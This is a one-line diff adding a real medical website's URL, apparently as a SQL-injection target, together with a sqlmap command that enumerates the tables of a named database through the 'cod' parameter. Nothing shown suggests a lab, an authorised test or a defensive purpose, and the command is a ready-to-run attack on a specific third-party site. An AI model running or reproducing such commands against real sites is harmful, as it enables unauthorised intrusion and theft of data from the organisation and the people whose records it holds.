@@ -1,0 +1,1 @@
+https://www.cardiopediatria.com.br/news_det.php?cod=23 (GET)  # sqlmap.py -u https://www.cardiopediatria.com.br/news_det.php?cod=23 -D centroco_ger --tables --threads 5 -v3
